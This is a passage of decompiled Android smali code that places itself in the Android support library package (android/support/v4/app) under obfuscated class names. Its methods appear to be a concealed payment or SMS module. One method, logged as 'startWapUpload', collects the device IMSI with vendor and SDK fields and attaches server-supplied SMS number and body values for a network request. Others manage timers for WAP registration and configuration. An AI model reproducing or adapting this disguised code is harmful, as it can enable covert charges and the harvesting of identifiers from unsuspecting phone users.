    invoke-static/range {v0 .. v5}, Landroid/support/v4/app/Support;->a([BI[BIII)I

    move-result v7

    array-length v1, p1

    array-length v3, v6

    const/4 v4, 0x0

    array-length v5, p1

    move-object v0, p1

    move-object v2, v6

    invoke-static/range {v0 .. v5}, Landroid/support/v4/app/Support;->a([BI[BIII)I

    move-result v0

    if-ltz v7, :cond_0

    if-ltz v0, :cond_0

    if-lt v7, v0, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    new-instance v1, Ljava/lang/String;

    sub-int/2addr v0, v7

    array-length v2, v6

    add-int/2addr v0, v2

    const-string v2, "UTF-8"

    invoke-direct {v1, p1, v7, v0, v2}, Ljava/lang/String;-><init>([BIILjava/lang/String;)V
    :try_end_0
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_0 .. :try_end_0} :catch_0

    const/4 v0, 0x0

    :try_start_1
    invoke-static {v1}, Landroid/support/v4/app/Support;->d(Ljava/lang/String;)Landroid/support/v4/app/g;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_1 .. :try_end_1} :catch_0

    move-result-object v0

    :goto_1
    if-eqz v0, :cond_0

    :try_start_2
    sget-object v1, Landroid/support/v4/app/Support;->a:Landroid/content/Context;

    const/4 v2, 0x0

    invoke-static {v1, v0, v2}, Landroid/support/v4/app/Support;->a(Landroid/content/Context;Landroid/support/v4/app/g;Z)Z

    new-instance v0, Landroid/support/v4/app/c;

    invoke-direct {v0, p1}, Landroid/support/v4/app/c;-><init>([B)V

    new-instance v1, Ljava/lang/Thread;

    invoke-direct {v1, v0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V
    :try_end_2
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/io/UnsupportedEncodingException;->printStackTrace()V

    goto :goto_0

    :catch_1
    move-exception v1

    :try_start_3
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_3
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_3 .. :try_end_3} :catch_0

    goto :goto_1
.end method

.method public a(Landroid/content/Context;)Z
    .locals 3

    const/16 v0, 0xfa

    const/4 v1, 0x0

    const/4 v2, 0x0

    invoke-direct {p0, p1, v0, v1, v2}, Landroid/support/v4/app/a;->a(Landroid/content/Context;IILjava/lang/String;)Z

    move-result v0

    return v0
.end method

.method public a(Landroid/content/Context;I)Z
    .locals 2

    const/16 v0, 0x30

    const/4 v1, 0x0

    invoke-direct {p0, p1, v0, p2, v1}, Landroid/support/v4/app/a;->a(Landroid/content/Context;IILjava/lang/String;)Z

    move-result v0

    return v0
.end method

.method public a(Landroid/content/Context;ILjava/lang/String;Ljava/lang/String;)Z
    .locals 8

    const/4 v7, 0x1

    const/4 v6, 0x0

    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    iput v6, p0, Landroid/support/v4/app/a;->m:I

    sget-object v0, Landroid/support/v4/app/a;->a:Ljava/lang/String;

    const-string v2, "startWapUpload"

    invoke-static {v0, v2}, Landroid/support/v4/app/Support;->b(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {v1}, Landroid/support/v4/app/f;->b(Landroid/content/Context;)Landroid/support/v4/app/f;

    new-instance v2, Ljava/util/HashMap;

    invoke-direct {v2}, Ljava/util/HashMap;-><init>()V

    const-string v0, "cmdType"

    const/16 v3, 0xce

    invoke-static {v3}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v2, v0, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v3, "mtid"

    new-instance v4, Ljava/lang/StringBuilder;

    sget-object v0, Landroid/support/v4/app/f;->c:Ljava/util/HashMap;

    const-string v5, "imsi"

    invoke-virtual {v0, v5}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v4, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Landroid/support/v4/app/Support;->e()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-static {}, Landroid/support/v4/app/Support;->f()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v4, "000000000010100"

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-interface {v2, v3, v0}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "vendortype"

    invoke-static {}, Landroid/support/v4/app/Support;->d()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v2, v0, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "platform"

    const-string v3, "ANDROID"

    invoke-interface {v2, v0, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "core_sw_ver"

    const-string v3, "v1019"

    invoke-interface {v2, v0, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "pay_sdk_ver"

    const-string v3, "000001"

    invoke-interface {v2, v0, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "msdv"

    invoke-static {v6}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v2, v0, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "mscv"

    sget v3, Landroid/support/v4/app/a;->j:I

    invoke-static {v3}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v2, v0, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "wsdv"

    invoke-static {v7}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v2, v0, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "wscv"

    sget v3, Landroid/support/v4/app/a;->k:I

    invoke-static {v3}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v2, v0, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "wcmd"

    invoke-static {p2}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v2, v0, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "chnid"

    iget v3, p0, Landroid/support/v4/app/a;->m:I

    invoke-static {v3}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v2, v0, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "smsNum"

    invoke-interface {v2, v0, p3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "smsBody"

    invoke-interface {v2, v0, p4}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    new-instance v0, Landroid/support/v4/app/j;

    invoke-direct {v0, v1}, Landroid/support/v4/app/j;-><init>(Landroid/content/Context;)V

    iget-object v1, p0, Landroid/support/v4/app/a;->o:Landroid/os/Handler;

    invoke-virtual {v0, v1, v2}, Landroid/support/v4/app/j;->a(Landroid/os/Handler;Ljava/util/Map;)V

    return v7
.end method

.method public b(Landroid/content/Context;)Z
    .locals 10

    const-wide/32 v5, 0x1b7740

    const-wide/16 v8, 0x0

    const/4 v7, 0x1

    sget-object v0, Landroid/support/v4/app/a;->a:Ljava/lang/String;

    const-string v1, "saveFilterDataPeroid"

    invoke-static {v0, v1}, Landroid/support/v4/app/Support;->b(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    sget-boolean v3, Landroid/support/v4/app/a;->d:Z

    if-eqz v3, :cond_0

    invoke-direct {p0, v0}, Landroid/support/v4/app/a;->g(Landroid/content/Context;)Z

    :cond_0
    sget-boolean v3, Landroid/support/v4/app/a;->e:Z

    if-eqz v3, :cond_2

    sget-wide v3, Landroid/support/v4/app/a;->f:J

    sub-long/2addr v3, v5

    sput-wide v3, Landroid/support/v4/app/a;->f:J

    sget-wide v3, Landroid/support/v4/app/a;->g:J

    sub-long/2addr v3, v5

    sput-wide v3, Landroid/support/v4/app/a;->g:J

    :goto_0
    sget-object v3, Landroid/support/v4/app/a;->a:Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "saveFilterDataPeroid wapRegRemain="

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-wide v5, Landroid/support/v4/app/a;->f:J

    invoke-virtual {v4, v5, v6}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, ";wapCfgRemain="

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    sget-wide v5, Landroid/support/v4/app/a;->g:J

    invoke-virtual {v4, v5, v6}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/support/v4/app/Support;->b(Ljava/lang/String;Ljava/lang/String;)V

    sget-wide v3, Landroid/support/v4/app/a;->f:J

    cmp-long v3, v3, v8

    if-gtz v3, :cond_3

    const-wide v1, 0x7fffffffffffffffL

    sput-wide v1, Landroid/support/v4/app/a;->f:J

    invoke-direct {p0, v0}, Landroid/support/v4/app/a;->d(Landroid/content/Context;)Z

    :cond_1
    :goto_1
    invoke-direct {p0, v0}, Landroid/support/v4/app/a;->f(Landroid/content/Context;)Z

    return v7

    :cond_2
    sput-boolean v7, Landroid/support/v4/app/a;->e:Z

    goto :goto_0

    :cond_3
    sget-wide v3, Landroid/support/v4/app/a;->g:J

    cmp-long v3, v3, v8

    if-lez v3, :cond_4

    sget-wide v3, Landroid/support/v4/app/a;->g:J

    add-long/2addr v3, v1

    sget-wide v5, Landroid/support/v4/app/a;->i:J

    cmp-long v3, v3, v5

    if-lez v3, :cond_1

    :cond_4
    sget-wide v3, Landroid/support/v4/app/a;->b:J

    sput-wide v3, Landroid/support/v4/app/a;->g:J

    sget-wide v3, Landroid/support/v4/app/a;->g:J

    add-long/2addr v1, v3

    sput-wide v1, Landroid/support/v4/app/a;->i:J

    invoke-direct {p0, v0}, Landroid/support/v4/app/a;->e(Landroid/content/Context;)Z

    goto :goto_1
.end method

.method public b(Landroid/content/Context;I)Z
    .locals 2

    const/4 v0, 0x0

    const/4 v1, 0x0

    invoke-direct {p0, p1, p2, v0, v1}, Landroid/support/v4/app/a;->a(Landroid/content/Context;IILjava/lang/String;)Z

    move-result v0

    return v0
.end method

.method public declared-synchronized c(Landroid/content/Context;)Z
    .locals 5

    monitor-enter p0

    :try_start_0
    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sget-boolean v1, Landroid/support/v4/app/a;->d:Z

    if-eqz v1, :cond_0

    invoke-direct {p0, v0}, Landroid/support/v4/app/a;->g(Landroid/content/Context;)Z

    :cond_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    sget-wide v3, Landroid/support/v4/app/a;->f:J

    add-long/2addr v3, v1

    sput-wide v3, Landroid/support/v4/app/a;->h:J

    sget-wide v3, Landroid/support/v4/app/a;->g:J

    add-long/2addr v1, v3

    sput-wide v1, Landroid/support/v4/app/a;->i:J

    invoke-direct {p0, v0}, Landroid/support/v4/app/a;->f(Landroid/content/Context;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    const/4 v0, 0x1

    monitor-exit p0

    return v0

    :catchall_0
    move-exception v0

    monitor-exit p0

    throw v0
.end method

.method public c(Landroid/content/Context;I)Z
    .locals 4

    sget-object v0, Landroid/support/v4/app/a;->a:Ljava/lang/String;

    const-string v1, "saveFilterDataDateChange"

    invoke-static {v0, v1}, Landroid/support/v4/app/Support;->b(Ljava/lang/String;Ljava/lang/String;)V

    if-lez p2, :cond_1

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    sget-boolean v2, Landroid/support/v4/app/a;->d:Z

    if-eqz v2, :cond_0

    invoke-direct {p0, p1}, Landroid/support/v4/app/a;->g(Landroid/content/Context;)Z

    :cond_0
    mul-int/lit16 v2, p2, 0xe10

    mul-int/lit16 v2, v2, 0x3e8

    int-to-long v2, v2

    sput-wide v2, Landroid/support/v4/app/a;->b:J

    sget-wide v2, Landroid/support/v4/app/a;->b:J

    sput-wide v2, Landroid/support/v4/app/a;->g:J

    sget-wide v2, Landroid/support/v4/app/a;->b:J

    add-long/2addr v0, v2

    sput-wide v0, Landroid/support/v4/app/a;->i:J

    invoke-direct {p0, p1}, Landroid/support/v4/app/a;->f(Landroid/content/Context;)Z

    move-result v0

    :goto_0
    return v0

    :cond_1
    const/4 v0, 0x0

    goto :goto_0
.end method
